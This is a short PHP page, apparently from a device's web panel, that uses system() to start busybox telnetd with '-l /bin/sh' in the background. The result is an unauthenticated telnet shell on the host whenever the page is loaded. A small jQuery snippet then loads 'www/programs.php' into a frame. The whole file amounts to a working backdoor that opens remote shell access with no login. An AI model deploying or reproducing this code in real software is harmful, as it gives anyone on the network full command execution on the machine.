<?php
echo '<pre>';
system('../../busybox telnetd -l /bin/sh &', $retval);
echo '</pre>';
if ( $retval == "0") echo 'Done.'; else echo 'Failed!';
flush();
?>
<script type="text/javascript">
$('#mainFrame').load('www/programs.php');
</script>
